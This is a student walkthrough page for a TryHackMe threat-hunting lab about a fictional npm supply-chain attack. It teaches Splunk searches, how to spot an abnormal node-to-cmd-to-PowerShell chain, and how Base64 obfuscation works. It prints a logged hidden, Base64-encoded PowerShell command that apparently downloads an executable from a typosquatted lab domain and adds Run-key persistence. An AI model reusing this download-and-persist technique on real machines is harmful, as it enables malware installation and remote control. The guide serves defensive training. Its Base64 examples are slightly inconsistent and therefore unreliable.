<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Health Hazard ‚Äî TryHackMe Lab Guide</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #080c10;
    --bg2: #0d1117;
    --bg3: #111820;
    --panel: #0f1923;
    --border: #1e3a4a;
    --accent: #00e5ff;
    --accent2: #ff6b35;
    --accent3: #39ff14;
    --warn: #ffd600;
    --danger: #ff3d57;
    --text: #c8d8e4;
    --text-dim: #5a7a8a;
    --mono: 'Share Tech Mono', monospace;
    --head: 'Rajdhani', sans-serif;
    --body: 'Inter', sans-serif;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--body);
    font-size: 15px;
    line-height: 1.7;
    overflow-x: hidden;
  }

  /* ‚îÄ‚îÄ SCANLINE OVERLAY ‚îÄ‚îÄ */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,229,255,0.015) 2px,
      rgba(0,229,255,0.015) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  /* ‚îÄ‚îÄ HERO ‚îÄ‚îÄ */
  .hero {
    position: relative;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
    padding: 60px 20px;
    overflow: hidden;
  }

  .hero-grid {
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,229,255,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,229,255,0.04) 1px, transparent 1px);
    background-size: 50px 50px;
    animation: gridScroll 20s linear infinite;
  }

  @keyframes gridScroll {
    from { transform: translateY(0); }
    to { transform: translateY(50px); }
  }

  .hero-glow {
    position: absolute;
    width: 600px;
    height: 600px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(0,229,255,0.07) 0%, transparent 70%);
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    animation: pulse 4s ease-in-out infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 0.6; transform: translate(-50%, -50%) scale(1); }
    50% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
  }

  .badge {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 3px;
    text-transform: uppercase;
    color: var(--accent);
    border: 1px solid rgba(0,229,255,0.3);
    padding: 6px 16px;
    border-radius: 2px;
    margin-bottom: 28px;
    position: relative;
    z-index: 2;
    animation: fadeUp 0.6s ease both;
  }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .hero h1 {
    font-family: var(--head);
    font-size: clamp(42px, 8vw, 86px);
    font-weight: 700;
    line-height: 1;
    letter-spacing: -1px;
    position: relative;
    z-index: 2;
    animation: fadeUp 0.6s 0.1s ease both;
  }

  .hero h1 span.hl { color: var(--accent); }
  .hero h1 span.hl2 { color: var(--accent2); }

  .hero-sub {
    font-size: 16px;
    color: var(--text-dim);
    max-width: 600px;
    margin-top: 20px;
    position: relative;
    z-index: 2;
    animation: fadeUp 0.6s 0.2s ease both;
  }

  .hero-stats {
    display: flex;
    gap: 40px;
    margin-top: 50px;
    position: relative;
    z-index: 2;
    animation: fadeUp 0.6s 0.3s ease both;
    flex-wrap: wrap;
    justify-content: center;
  }

  .hero-stat {
    text-align: center;
  }

  .hero-stat .num {
    font-family: var(--mono);
    font-size: 28px;
    color: var(--accent);
    display: block;
  }

  .hero-stat .lbl {
    font-size: 11px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--text-dim);
  }

  .scroll-hint {
    position: absolute;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    color: var(--text-dim);
    font-size: 11px;
    letter-spacing: 2px;
    text-transform: uppercase;
    font-family: var(--mono);
    z-index: 2;
    animation: bounce 2s ease-in-out infinite;
  }

  @keyframes bounce {
    0%, 100% { transform: translateX(-50%) translateY(0); }
    50% { transform: translateX(-50%) translateY(-8px); }
  }

  .scroll-hint::after {
    content: '‚ñº';
    color: var(--accent);
  }

  /* ‚îÄ‚îÄ LAYOUT ‚îÄ‚îÄ */
  .container {
    max-width: 1100px;
    margin: 0 auto;
    padding: 0 24px;
  }

  /* ‚îÄ‚îÄ SECTION HEADER ‚îÄ‚îÄ */
  .section-header {
    display: flex;
    align-items: center;
    gap: 16px;
    margin-bottom: 40px;
    padding-top: 80px;
  }

  .step-num {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--accent);
    background: rgba(0,229,255,0.08);
    border: 1px solid rgba(0,229,255,0.2);
    padding: 4px 10px;
    border-radius: 2px;
    white-space: nowrap;
    letter-spacing: 1px;
  }

  .section-header h2 {
    font-family: var(--head);
    font-size: clamp(24px, 4vw, 36px);
    font-weight: 700;
    letter-spacing: 0.5px;
  }

  .section-header h2 em {
    font-style: normal;
    color: var(--accent);
  }

  /* ‚îÄ‚îÄ DIVIDER ‚îÄ‚îÄ */
  .divider {
    height: 1px;
    background: linear-gradient(90deg, var(--accent), transparent);
    margin: 0 0 40px;
    opacity: 0.3;
  }

  /* ‚îÄ‚îÄ CARDS ‚îÄ‚îÄ */
  .card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 28px 32px;
    margin-bottom: 20px;
    position: relative;
    overflow: hidden;
    transition: border-color 0.2s;
  }

  .card:hover { border-color: rgba(0,229,255,0.3); }

  .card::before {
    content: '';
    position: absolute;
    top: 0; left: 0;
    width: 3px;
    height: 100%;
    background: var(--accent);
  }

  .card.warn::before { background: var(--warn); }
  .card.danger::before { background: var(--danger); }
  .card.success::before { background: var(--accent3); }
  .card.orange::before { background: var(--accent2); }

  .card h3 {
    font-family: var(--head);
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 10px;
    color: #fff;
  }

  .card h3 .icon { margin-right: 8px; }

  .card p { color: var(--text); margin-bottom: 10px; }
  .card p:last-child { margin-bottom: 0; }

  /* ‚îÄ‚îÄ ATTACK CHAIN TIMELINE ‚îÄ‚îÄ */
  .timeline {
    position: relative;
    padding-left: 30px;
    margin: 10px 0;
  }

  .timeline::before {
    content: '';
    position: absolute;
    left: 10px; top: 0; bottom: 0;
    width: 2px;
    background: linear-gradient(to bottom, var(--accent), var(--accent2), var(--danger));
  }

  .timeline-item {
    position: relative;
    margin-bottom: 30px;
  }

  .timeline-item::before {
    content: '';
    position: absolute;
    left: -24px;
    top: 8px;
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: var(--accent);
    box-shadow: 0 0 10px var(--accent);
    border: 2px solid var(--bg);
  }

  .timeline-item:nth-child(2)::before { background: #a78bfa; box-shadow: 0 0 10px #a78bfa; }
  .timeline-item:nth-child(3)::before { background: var(--warn); box-shadow: 0 0 10px var(--warn); }
  .timeline-item:nth-child(4)::before { background: var(--accent2); box-shadow: 0 0 10px var(--accent2); }
  .timeline-item:nth-child(5)::before { background: var(--accent3); box-shadow: 0 0 10px var(--accent3); }
  .timeline-item:nth-child(6)::before { background: var(--danger); box-shadow: 0 0 10px var(--danger); }

  .timeline-item .tl-title {
    font-family: var(--head);
    font-size: 16px;
    font-weight: 600;
    color: #fff;
    margin-bottom: 4px;
  }

  .timeline-item .tl-tag {
    font-family: var(--mono);
    font-size: 10px;
    color: var(--accent);
    letter-spacing: 1.5px;
    text-transform: uppercase;
    margin-bottom: 6px;
  }

  .timeline-item p { font-size: 14px; color: var(--text-dim); }

  /* ‚îÄ‚îÄ TERMINAL BLOCK ‚îÄ‚îÄ */
  .terminal {
    background: #010b10;
    border: 1px solid #1a3a4a;
    border-radius: 4px;
    margin: 20px 0;
    overflow: hidden;
    font-family: var(--mono);
  }

  .terminal-bar {
    background: #0d1e28;
    padding: 8px 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px solid #1a3a4a;
  }

  .dot { width: 10px; height: 10px; border-radius: 50%; }
  .dot.r { background: #ff5f57; }
  .dot.y { background: #ffd600; }
  .dot.g { background: #28ca42; }

  .terminal-label {
    margin-left: auto;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 1px;
  }

  .terminal-body {
    padding: 20px 24px;
    font-size: 13px;
    line-height: 1.8;
    color: #aad8e6;
    overflow-x: auto;
  }

  .terminal-body .prompt { color: var(--accent3); }
  .terminal-body .cmd { color: #fff; }
  .terminal-body .comment { color: #3a6070; }
  .terminal-body .output { color: var(--text-dim); }
  .terminal-body .highlight { color: var(--warn); font-weight: bold; }
  .terminal-body .b64 {
    color: #ff6b35;
    word-break: break-all;
    background: rgba(255,107,53,0.08);
    padding: 2px 4px;
    border-radius: 2px;
  }
  .terminal-body .decoded { color: var(--accent3); }
  .terminal-body .key { color: var(--accent); }
  .terminal-body .val { color: #ffd600; }

  /* ‚îÄ‚îÄ INFO BOXES ‚îÄ‚îÄ */
  .infobox {
    border-radius: 4px;
    padding: 18px 22px;
    margin: 20px 0;
    display: flex;
    gap: 14px;
    align-items: flex-start;
  }

  .infobox.tip { background: rgba(0,229,255,0.05); border: 1px solid rgba(0,229,255,0.15); }
  .infobox.warn { background: rgba(255,214,0,0.05); border: 1px solid rgba(255,214,0,0.2); }
  .infobox.danger { background: rgba(255,61,87,0.05); border: 1px solid rgba(255,61,87,0.2); }
  .infobox.success { background: rgba(57,255,20,0.05); border: 1px solid rgba(57,255,20,0.2); }

  .infobox-icon { font-size: 20px; flex-shrink: 0; line-height: 1.6; }
  .infobox-text { flex: 1; }
  .infobox-text strong { color: #fff; font-size: 14px; display: block; margin-bottom: 4px; }
  .infobox-text p { font-size: 13px; color: var(--text-dim); margin: 0; }

  /* ‚îÄ‚îÄ IOC TABLE ‚îÄ‚îÄ */
  .ioc-table {
    width: 100%;
    border-collapse: collapse;
    margin: 20px 0;
    font-size: 13px;
  }

  .ioc-table th {
    background: rgba(0,229,255,0.06);
    color: var(--accent);
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 2px;
    text-transform: uppercase;
    padding: 12px 16px;
    text-align: left;
    border-bottom: 1px solid var(--border);
  }

  .ioc-table td {
    padding: 12px 16px;
    border-bottom: 1px solid rgba(30,58,74,0.4);
    color: var(--text);
    vertical-align: top;
  }

  .ioc-table tr:hover td { background: rgba(0,229,255,0.03); }
  .ioc-table .mono-val { font-family: var(--mono); color: var(--warn); font-size: 12px; }
  .ioc-table .tag {
    font-family: var(--mono);
    font-size: 10px;
    padding: 2px 8px;
    border-radius: 2px;
    letter-spacing: 1px;
    text-transform: uppercase;
  }
  .tag.host { background: rgba(0,229,255,0.12); color: var(--accent); }
  .tag.network { background: rgba(167,139,250,0.12); color: #a78bfa; }
  .tag.behavior { background: rgba(255,214,0,0.12); color: var(--warn); }

  /* ‚îÄ‚îÄ PROCESS CHAIN ‚îÄ‚îÄ */
  .process-chain {
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 0;
    margin: 20px 0;
    background: #010b10;
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 20px 24px;
    overflow-x: auto;
  }

  .proc-node {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 3px;
    padding: 10px 14px;
    font-family: var(--mono);
    font-size: 12px;
    white-space: nowrap;
  }

  .proc-node .proc-name { color: #fff; }
  .proc-node .proc-detail { color: var(--text-dim); font-size: 10px; margin-top: 2px; }
  .proc-node.bad { border-color: rgba(255,61,87,0.4); background: rgba(255,61,87,0.05); }
  .proc-node.bad .proc-name { color: var(--danger); }

  .proc-arrow {
    color: var(--accent2);
    font-size: 18px;
    padding: 0 8px;
    flex-shrink: 0;
  }

  /* ‚îÄ‚îÄ BASE64 EXPLAINER ‚îÄ‚îÄ */
  .b64-explainer {
    background: #010b10;
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 28px 32px;
    margin: 20px 0;
  }

  .b64-explainer h3 {
    font-family: var(--head);
    font-size: 20px;
    color: #fff;
    margin-bottom: 20px;
  }

  .b64-visual {
    display: grid;
    grid-template-columns: 1fr auto 1fr;
    gap: 16px;
    align-items: center;
    margin: 24px 0;
  }

  .b64-box {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 3px;
    padding: 16px;
  }

  .b64-box .b64-label {
    font-family: var(--mono);
    font-size: 10px;
    color: var(--text-dim);
    letter-spacing: 2px;
    text-transform: uppercase;
    margin-bottom: 10px;
  }

  .b64-box .b64-content {
    font-family: var(--mono);
    font-size: 12px;
    word-break: break-all;
    line-height: 1.6;
  }

  .b64-box.input .b64-content { color: var(--accent2); }
  .b64-box.output .b64-content { color: var(--accent3); }

  .b64-arrow {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    color: var(--accent);
    font-size: 22px;
  }

  .b64-arrow .arrow-label {
    font-family: var(--mono);
    font-size: 9px;
    color: var(--text-dim);
    letter-spacing: 1px;
    text-transform: uppercase;
    white-space: nowrap;
  }

  /* ‚îÄ‚îÄ STEPS ‚îÄ‚îÄ */
  .steps-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: 20px;
    margin: 20px 0;
  }

  .step-card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 24px;
    position: relative;
    overflow: hidden;
    transition: transform 0.2s, border-color 0.2s;
  }

  .step-card:hover {
    transform: translateY(-3px);
    border-color: rgba(0,229,255,0.3);
  }

  .step-card .step-n {
    font-family: var(--mono);
    font-size: 42px;
    color: rgba(0,229,255,0.08);
    position: absolute;
    top: 10px; right: 16px;
    line-height: 1;
    font-weight: bold;
  }

  .step-card h4 {
    font-family: var(--head);
    font-size: 16px;
    font-weight: 600;
    color: #fff;
    margin-bottom: 8px;
  }

  .step-card p { font-size: 13px; color: var(--text-dim); line-height: 1.6; }

  /* ‚îÄ‚îÄ MITRE TABLE ‚îÄ‚îÄ */
  .mitre-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
    gap: 14px;
    margin: 20px 0;
  }

  .mitre-card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 18px;
  }

  .mitre-id {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--accent2);
    letter-spacing: 1px;
    margin-bottom: 6px;
  }

  .mitre-name {
    font-family: var(--head);
    font-size: 15px;
    font-weight: 600;
    color: #fff;
    margin-bottom: 6px;
  }

  .mitre-desc { font-size: 12px; color: var(--text-dim); }

  /* ‚îÄ‚îÄ CHECKLIST ‚îÄ‚îÄ */
  .checklist {
    list-style: none;
    margin: 16px 0;
  }

  .checklist li {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 8px 0;
    border-bottom: 1px solid rgba(30,58,74,0.3);
    font-size: 14px;
  }

  .checklist li:last-child { border-bottom: none; }

  .check-box {
    width: 20px;
    height: 20px;
    border: 1px solid var(--border);
    border-radius: 2px;
    flex-shrink: 0;
    margin-top: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 11px;
  }

  .checklist li.done .check-box {
    background: rgba(57,255,20,0.1);
    border-color: var(--accent3);
    color: var(--accent3);
  }

  /* ‚îÄ‚îÄ FOOTER ‚îÄ‚îÄ */
  .footer {
    margin-top: 100px;
    border-top: 1px solid var(--border);
    padding: 40px 0;
    text-align: center;
    color: var(--text-dim);
    font-size: 13px;
    font-family: var(--mono);
    letter-spacing: 1px;
  }

  .footer span { color: var(--accent); }

  /* ‚îÄ‚îÄ NAV ‚îÄ‚îÄ */
  .nav {
    position: sticky;
    top: 0;
    z-index: 100;
    background: rgba(8,12,16,0.9);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
    padding: 12px 24px;
  }

  .nav-inner {
    max-width: 1100px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    gap: 8px;
    overflow-x: auto;
    scrollbar-width: none;
  }

  .nav-inner::-webkit-scrollbar { display: none; }

  .nav-brand {
    font-family: var(--mono);
    font-size: 13px;
    color: var(--accent);
    margin-right: 20px;
    white-space: nowrap;
    flex-shrink: 0;
  }

  .nav-link {
    font-family: var(--mono);
    font-size: 11px;
    color: var(--text-dim);
    text-decoration: none;
    letter-spacing: 1px;
    text-transform: uppercase;
    padding: 4px 10px;
    border-radius: 2px;
    white-space: nowrap;
    transition: color 0.2s, background 0.2s;
    flex-shrink: 0;
  }

  .nav-link:hover {
    color: var(--accent);
    background: rgba(0,229,255,0.06);
  }

  /* ‚îÄ‚îÄ SPLUNK GUIDE ‚îÄ‚îÄ */
  .splunk-steps {
    counter-reset: splunk;
    list-style: none;
    margin: 20px 0;
  }

  .splunk-steps > li {
    counter-increment: splunk;
    position: relative;
    padding: 20px 20px 20px 60px;
    border-left: 2px solid var(--border);
    margin-bottom: 8px;
    background: var(--panel);
    border-radius: 0 4px 4px 0;
  }

  .splunk-steps > li::before {
    content: counter(splunk);
    position: absolute;
    left: 16px;
    top: 20px;
    font-family: var(--mono);
    font-size: 20px;
    color: var(--accent);
    font-weight: bold;
    line-height: 1;
  }

  .splunk-steps > li strong {
    display: block;
    font-family: var(--head);
    font-size: 15px;
    color: #fff;
    margin-bottom: 6px;
  }

  .splunk-steps > li p {
    font-size: 13px;
    color: var(--text-dim);
    margin-bottom: 8px;
  }

  /* ‚îÄ‚îÄ RESPONSIVE ‚îÄ‚îÄ */
  @media (max-width: 640px) {
    .b64-visual { grid-template-columns: 1fr; }
    .b64-arrow { transform: rotate(90deg); }
    .process-chain { flex-direction: column; align-items: flex-start; }
    .proc-arrow { transform: rotate(90deg); }
  }
</style>
</head>
<body>

<!-- NAV -->
<nav class="nav">
  <div class="nav-inner">
    <span class="nav-brand">// HEALTH HAZARD</span>
    <a href="#overview" class="nav-link">Overview</a>
    <a href="#scenario" class="nav-link">Scenario</a>
    <a href="#splunk" class="nav-link">Splunk</a>
    <a href="#b64" class="nav-link">Base64</a>
    <a href="#decode" class="nav-link">Decode</a>
    <a href="#machine" class="nav-link">Machine</a>
    <a href="#mitre" class="nav-link">MITRE</a>
    <a href="#iocs" class="nav-link">IOCs</a>
    <a href="#checklist" class="nav-link">Checklist</a>
  </div>
</nav>

<!-- HERO -->
<section class="hero" id="overview">
  <div class="hero-grid"></div>
  <div class="hero-glow"></div>
  <div class="badge">TryHackMe ¬∑ Threat Hunting Simulator</div>
  <h1><span class="hl">HEALTH</span> <span class="hl2">HAZARD</span></h1>
  <p class="hero-sub">A complete student guide to the supply chain attack lab ‚Äî from Splunk log analysis to Base64 decoding and artifact confirmation.</p>
  <div class="hero-stats">
    <div class="hero-stat"><span class="num">6</span><span class="lbl">Attack Stages</span></div>
    <div class="hero-stat"><span class="num">1</span><span class="lbl">Malicious Package</span></div>
    <div class="hero-stat"><span class="num">4</span><span class="lbl">Key IOCs</span></div>
    <div class="hero-stat"><span class="num">Easy</span><span class="lbl">Difficulty</span></div>
  </div>
  <div class="scroll-hint">scroll to start</div>
</section>

<!-- SCENARIO -->
<section id="scenario">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 00</span>
      <h2>What Is This <em>Lab About?</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card">
      <h3><span class="icon">üè¢</span> The Company: PawPressMe</h3>
      <p>PawPressMe is a small online media company. They help brands produce digital content, ebooks, and social media strategies. Small team, fast-paced work environment.</p>
      <p>A co-founder named <strong style="color:var(--warn)">Tom Whiskers</strong> was building the company website. He installed several Node.js packages from the npm registry to help with development. This is where the attacker's trap was waiting.</p>
    </div>

    <div class="infobox warn">
      <span class="infobox-icon">‚ö†Ô∏è</span>
      <div class="infobox-text">
        <strong>What is a Supply Chain Attack?</strong>
        <p>Instead of attacking the company directly, the attacker poisoned a software package that Tom would innocently install. When Tom ran <code>npm install</code>, the malware executed automatically ‚Äî no phishing email, no exploit needed. Tom did nothing obviously wrong.</p>
      </div>
    </div>

    <div class="section-header" style="padding-top: 40px;">
      <span class="step-num">THE FULL ATTACK</span>
      <h2>The Complete <em>Attack Chain</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card">
      <div class="timeline">
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1195.001 ¬∑ Supply Chain</div>
          <div class="tl-title">1. Attacker Publishes Malicious npm Package</div>
          <p>A package named <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="771f12161b031f141f1c5a1b1e15374659475946">[email&#160;protected]</a></code> is published to the npm registry. It looks like a legitimate "health check library" but contains a hidden malicious script in its <code>postinstall</code> hook.</p>
        </div>
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1204 ¬∑ User Execution</div>
          <div class="tl-title">2. Tom Installs the Package</div>
          <p>Tom runs <code>npm install <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8ee6ebefe2fae6ede6e5a3e2e7eccebfa0bea0bf">[email&#160;protected]</a></code> in <code>C:\Development\</code> while building the company website. He has no idea the package is malicious.</p>
        </div>
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1059.001 ¬∑ PowerShell</div>
          <div class="tl-title">3. postinstall.ps1 Triggers Automatically</div>
          <p>npm automatically runs any script defined in <code>postinstall</code> after installation. The malicious <code>postinstall.ps1</code> script fires silently, spawning a hidden PowerShell process running an obfuscated Base64-encoded command.</p>
        </div>
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1105 ¬∑ Ingress Tool Transfer</div>
          <div class="tl-title">4. Malware Downloads from C2 Server</div>
          <p>The decoded PowerShell command uses <code>Invoke-WebRequest</code> to download <code>SystemHealthUpdater.exe</code> from <code>http://global-update.wlndows.thm/</code> ‚Äî note "wlndows" is a typosquatted fake domain. It is saved to <code>%APPDATA%</code>, a hidden folder.</p>
        </div>
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1547.001 ¬∑ Registry Run Keys</div>
          <div class="tl-title">5. Malware Sets Persistence via Registry</div>
          <p>The script adds a registry entry named <strong>"Windows Update Monitor"</strong> under <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>. This makes the malware start on every user login ‚Äî it sounds official and harmless.</p>
        </div>
        <div class="timeline-item">
          <div class="tl-tag">MITRE T1571 ¬∑ C2 Communication</div>
          <div class="tl-title">6. Executable Runs & Calls Back to Attacker</div>
          <p>The malware silently executes and establishes communication with the attacker's Command & Control (C2) server, giving them remote control over Tom's machine.</p>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- SPLUNK -->
<section id="splunk">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 01</span>
      <h2>Finding the <em>Evidence in Splunk</em></h2>
    </div>
    <div class="divider"></div>

    <div class="infobox tip">
      <span class="infobox-icon">üí°</span>
      <div class="infobox-text">
        <strong>What is Splunk?</strong>
        <p>Splunk is a SIEM (Security Information & Event Management) tool. It collects logs from computers and lets you search through them. Think of it like a super-powered search engine for everything that happened on a system ‚Äî every command run, every file downloaded, every process started.</p>
      </div>
    </div>

    <h3 style="font-family:var(--head); font-size:18px; margin:28px 0 16px; color:#fff;">How to Navigate Splunk in This Lab</h3>

    <ol class="splunk-steps">
      <li>
        <strong>Open the SIEM Tab in the simulator dashboard</strong>
        <p>Click on the SIEM tab inside the TryHackMe simulator. This opens Splunk Enterprise with the logs pre-loaded for you.</p>
      </li>
      <li>
        <strong>Search for "npm" to find the first trace</strong>
        <p>In the Splunk search bar, type <code>npm</code> and search across all time. You're looking for the moment Tom installed the malicious package.</p>
        <div class="terminal">
          <div class="terminal-bar">
            <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
            <span class="terminal-label">SPLUNK SEARCH</span>
          </div>
          <div class="terminal-body">
            <span class="prompt">SPL&gt;</span> <span class="cmd">index=* npm</span><br>
            <span class="comment">-- Expect about 5 results. Start from the EARLIEST (bottom) and work up.</span>
          </div>
        </div>
      </li>
      <li>
        <strong>Find the npm install event ‚Äî confirm the IOC</strong>
        <p>In the results, look at the <code>CommandLine</code> field. You will find a command like the one below. The package name <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="48202d29243c202b20236524212a087966786679">[email&#160;protected]</a></code> matches the IOC you were given in the dashboard ‚Äî this confirms the initial access.</p>
        <div class="terminal">
          <div class="terminal-bar">
            <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
            <span class="terminal-label">SPLUNK EVENT ‚Äî CommandLine Field</span>
          </div>
          <div class="terminal-body">
            <span class="key">CommandLine:</span> <span class="val">npx npm install <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="503835313c243833383b7d3c393210617e607e61">[email&#160;protected]</a></span><br>
            <span class="key">CurrentDirectory:</span> <span class="val">C:\Development\</span><br>
            <span class="key">User:</span> <span class="val">PAW-TOM\itadmin-tom</span><br>
            <span class="key">ParentImage:</span> <span class="val">node.exe</span>
          </div>
        </div>
      </li>
      <li>
        <strong>Look at the NEXT event up ‚Äî the suspicious PowerShell</strong>
        <p>The next event in the chain shows the <code>postinstall.ps1</code> script firing. It spawned a hidden PowerShell command. This is where students get confused ‚Äî you'll see a long Base64 string after <code>-EncodedCommand</code>.</p>
        <div class="terminal">
          <div class="terminal-bar">
            <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
            <span class="terminal-label">SPLUNK EVENT ‚Äî The Obfuscated Command</span>
          </div>
          <div class="terminal-body">
            <span class="key">CommandLine:</span><br>
            <span class="cmd">powershell.exe -NoP -W Hidden -EncodedCommand</span><br>
            <span class="b64">JABjAG8AbgBuAGUAYwB0AGkAbwBuAFMAdAByAGkAbgBnACAAPQAgACcAaAB0AHQAcAA6AC8ALwBnAGwAbwBiAGEAbAAtAHUAcABkAGEAdABlAC4AdwBsAG4AZABvAHcAcwAuAHQAaABtAC8AU3lzdGVtSGVhbHRoVXBkYXRlci5leGUn...</span><br><br>
            <span class="comment">‚ö† This is the Base64-encoded payload. It's hiding a PowerShell script.</span><br><br>
            <span class="key">ParentCommandLine:</span> <span class="val">cmd.exe /c powershell.exe ...</span><br>
            <span class="key">ParentImage:</span> <span class="val">node.exe ‚Üí cmd.exe ‚Üí powershell.exe</span><br>
            <span class="highlight">‚ö† ABNORMAL process chain! This is a major red flag.</span>
          </div>
        </div>
      </li>
    </ol>

    <h3 style="font-family:var(--head); font-size:18px; margin:28px 0 16px; color:#fff;">The Abnormal Process Chain ‚Äî Why It Matters</h3>
    <p style="color:var(--text-dim); margin-bottom:16px; font-size:14px;">Normal software does not spawn processes in this chain. This pattern is a classic sign of a malicious post-install script executing hidden code:</p>

    <div class="process-chain">
      <div class="proc-node">
        <div class="proc-name">node.exe</div>
        <div class="proc-detail">npm runtime (normal)</div>
      </div>
      <div class="proc-arrow">‚Üí</div>
      <div class="proc-node bad">
        <div class="proc-name">cmd.exe</div>
        <div class="proc-detail">postinstall.ps1</div>
      </div>
      <div class="proc-arrow">‚Üí</div>
      <div class="proc-node bad">
        <div class="proc-name">powershell.exe</div>
        <div class="proc-detail">-NoP -W Hidden</div>
      </div>
      <div class="proc-arrow">‚Üí</div>
      <div class="proc-node bad">
        <div class="proc-name">Base64 Payload</div>
        <div class="proc-detail">Obfuscated malware</div>
      </div>
    </div>

    <div class="infobox danger">
      <span class="infobox-icon">üö®</span>
      <div class="infobox-text">
        <strong>Red Flags in This Event</strong>
        <p><strong>1.</strong> <code>node.exe ‚Üí cmd.exe ‚Üí powershell.exe</code> ‚Äî abnormal parent-child chain. <strong>2.</strong> <code>-W Hidden</code> ‚Äî PowerShell is running invisibly to the user. <strong>3.</strong> <code>-EncodedCommand</code> ‚Äî the command is deliberately obfuscated with Base64. <strong>4.</strong> <code>-NoP</code> (No Profile) ‚Äî skips security policies.</p>
      </div>
    </div>
  </div>
</section>

<!-- BASE64 -->
<section id="b64">
  <div class="container">
    <div class="section-header">
      <span class="step-num">STEP 02</span>
      <h2>Understanding <em>Base64 Obfuscation</em></h2>
    </div>
    <div class="divider"></div>

    <div class="card">
      <h3><span class="icon">üîê</span> What is Base64?</h3>
      <p>Base64 is an <strong style="color:#fff">encoding scheme</strong> ‚Äî not encryption. It converts any data (text, commands, even files) into a string of letters and numbers. It was invented to safely send binary data over text-based systems like email.</p>
      <p style="margin-top:10px;">The Base64 alphabet only uses: <code style="color:var(--accent)">A-Z</code>, <code style="color:var(--accent)">a-z</code>, <code style="color:var(--accent)">0-9</code>, <code style="color:var(--accent)">+</code>, <code style="color:var(--accent)">/</code>, and <code style="color:var(--accent)">=</code> (for padding).</p>
    </div>

    <div class="b64-explainer">
      <h3>üì¶ How Encoding Works ‚Äî Simple Example</h3>
      <p style="color:var(--text-dim); font-size:14px; margin-bottom:16px;">Imagine you want to hide the command <code>Write-Host "Hello"</code>. Instead of sending it in plain text, you convert it to Base64. Anyone seeing it just sees random-looking text.</p>

      <div class="b64-visual">
        <div class="b64-box input">
          <div class="b64-label">Original Command (plain text)</div>
          <div class="b64-content">Write-Host "Hello World"</div>
        </div>
        <div class="b64-arrow">
          ‚Üí
          <span class="arrow-label">Base64 encode<br>(UTF-16LE)</span>
        </div>
        <div class="b64-box output">
          <div class="b64-label">Encoded (what you see in Splunk)</div>
          <div class="b64-content">VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAA</div>
        </div>
      </div>

      <div class="infobox tip" style="margin-top:0;">
        <span class="infobox-icon">‚Ü©Ô∏è</span>
        <div class="infobox-text">
          <strong>And decoding just reverses it!</strong>
          <p>Base64 is fully reversible. Anyone with the encoded string can decode it instantly. There is no key, no password ‚Äî it's just encoding, not real security. Attackers use it purely to <strong>hide their commands from quick human inspection</strong> and to bypass simple pattern-matching security tools.</p>
        </div>
      </div>
